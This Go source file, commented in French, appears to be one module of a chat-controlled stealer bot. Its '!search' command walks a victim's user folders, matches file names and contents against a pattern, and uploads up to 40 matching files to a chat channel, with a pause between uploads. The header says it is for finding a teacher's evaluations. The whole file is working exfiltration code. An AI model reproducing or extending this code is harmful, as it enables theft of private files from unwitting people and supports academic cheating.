// search.go — recherche de fichiers et envoi des résultats.
//
// `!search eval` envoie tout ce qui contient « eval » dans le nom (et, pour
// les fichiers texte, dans le contenu). C'est la commande qui remplace une
// fouille manuelle quand on cherche les évaluations d'un prof.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	searchMaxSend = 40
	searchMaxSize = 8 * 1024 * 1024
)

// textExts : extensions dont on lit le contenu pour la recherche.
var textExts = map[string]bool{
	".txt": true, ".md": true, ".csv": true, ".json": true, ".xml": true,
	".html": true, ".htm": true, ".log": true, ".ini": true, ".rtf": true,
}

// matchNameOrContent dit si le fichier correspond au motif.
func matchNameOrContent(path string, pattern string) bool {
	if strings.Contains(fold(filepath.Base(path)), pattern) {
		return true
	}
	if !textExts[strings.ToLower(filepath.Ext(path))] {
		return false
	}
	st, err := os.Stat(path)
	if err != nil || st.Size() > 2*1024*1024 {
		return false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	return strings.Contains(fold(string(data)), pattern)
}

// searchSend parcourt les dossiers utilisateur, envoie les fichiers qui
// correspondent et rend un résumé. Le motif est cherché en minuscules, sans
// accents.
func searchSend(pattern string, max int) string {
	pattern = strings.TrimSpace(pattern)
	if pattern == "" {
		return "usage : !search <motif> [max]"
	}
	if max <= 0 || max > searchMaxSend {
		max = searchMaxSend
	}
	needle := fold(pattern)
	ch := evalChannel()

	var found []string
	sent, bytes := 0, 0
	for _, root := range exfilRoots() {
		if stopped.Load() || sent >= max {
			break
		}
		_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil || sent >= max {
				return nil
			}
			if skipExfil(p, info) {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
			if info.IsDir() || info.Size() == 0 || info.Size() > searchMaxSize {
				return nil
			}
			if !matchNameOrContent(p, needle) {
				return nil
			}
			data, rerr := os.ReadFile(p)
			if rerr != nil {
				return nil
			}
			sendFilesTo(ch, fileOut{Name: filepath.Base(p), Data: data})
			sent++
			bytes += len(data)
			found = append(found, p)
			time.Sleep(500 * time.Millisecond)
			return nil
		})
	}
	if sent == 0 {
		return fmt.Sprintf("aucun fichier ne contient `%s`.", pattern)
	}
	lines := strings.Join(found, "\n")
	if len(lines) > 1200 {
		lines = lines[:1200] + "…"
	}
	return fmt.Sprintf("%d fichier(s) pour `%s` envoyés dans <#%s> (%d Mo) :\n```\n%s\n```",
		sent, pattern, ch, bytes/1024/1024, lines)
}
